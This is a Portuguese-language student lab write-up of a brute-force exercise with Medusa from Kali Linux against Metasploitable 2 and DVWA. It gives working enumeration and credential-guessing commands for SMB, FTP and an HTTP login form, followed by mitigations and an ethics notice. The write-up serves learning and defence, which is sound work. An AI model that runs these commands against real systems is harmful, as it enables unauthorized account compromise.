🛡️ Simulação de Ataque de Força Bruta com Medusa e Kali Linux
Este projeto documenta uma auditoria de segurança prática realizada em ambiente controlado, utilizando o Kali Linux contra o alvo Metasploitable 2. O objetivo foi explorar vulnerabilidades de autenticação em diferentes serviços (FTP, HTTP e SMB) para validar conceitos de Cybersecurity e aplicar medidas de mitigação.

🚀 Tecnologias e Ferramentas Utilizadas
Sistema Operacional: Kali Linux (Atacante)

Alvo Vulnerável: Metasploitable 2 e DVWA (Damn Vulnerable Web Application)

Ferramenta de Auditoria: Medusa

Enumeração e Reconhecimento: enum4linux, Nmap e smbclient

Ambiente: VirtualBox em rede Host-Only

🛠️ Desenvolvimento do Projeto
1. Enumeração de Usuários (Protocolo SMB)
A primeira etapa consistiu no reconhecimento do alvo. Utilizei o enum4linux para extrair informações do serviço SMB, o que permitiu identificar usuários válidos e estruturar uma wordlist assertiva para os ataques seguintes.

Bash
# Comando utilizado para enumeração completa
enum4linux -a 192.168.56.103
📸 Evidência de Enumeração
2. Ataque de Força Bruta em FTP
Com a lista de usuários em mãos, utilizei o Medusa para realizar um ataque de dicionário contra o serviço de transferência de arquivos (FTP). O ataque foi bem-sucedido ao identificar credenciais válidas.

Bash
# Execução do ataque com listas de usuários e senhas
medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp
📸 Evidência de Sucesso no FTP
3. Ataque em Formulário Web (DVWA)
O cenário mais complexo envolveu a automação de tentativas de login em um formulário HTTP POST. Utilizei os parâmetros do Medusa para identificar o campo de usuário, senha e a mensagem de erro retornada pela aplicação para validar o sucesso.

Bash
# Comando para brute force em formulário HTTP POST
medusa -h 192.168.56.103 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed'
📸 Evidência de Sucesso no DVWA
🛡️ Medidas de Prevenção e Mitigação
Para proteger infraestruturas contra os ataques simulados neste projeto, as seguintes boas práticas são recomendadas:

Políticas de Senhas Fortes: Implementação de requisitos mínimos de complexidade (caracteres especiais, números e letras) e tamanho.

Account Lockout (Bloqueio de Conta): Configurar o sistema para bloquear temporariamente o acesso após um número determinado de tentativas falhas.

MFA (Autenticação de Dois Fatores): Adicionar uma camada extra de segurança que impede o acesso mesmo que a senha seja comprometida.

Monitoramento e IPS: Utilizar sistemas de detecção e prevenção de intrusão para bloquear automaticamente IPs que demonstrem comportamento de força bruta.

🎓 Sobre a Autora
Este projeto foi desenvolvido por Bianca Borges Da Silva, estudante de Ciência da Computação e Embaixadora Universitária da DIO. O foco do estudo é consolidar conhecimentos práticos em segurança ofensiva e defesa cibernética.

Aviso Ético: Esta atividade foi realizada estritamente em ambiente de laboratório para fins de aprendizado acadêmico. Nunca realize testes de intrusão em sistemas sem autorização prévia por escrito.
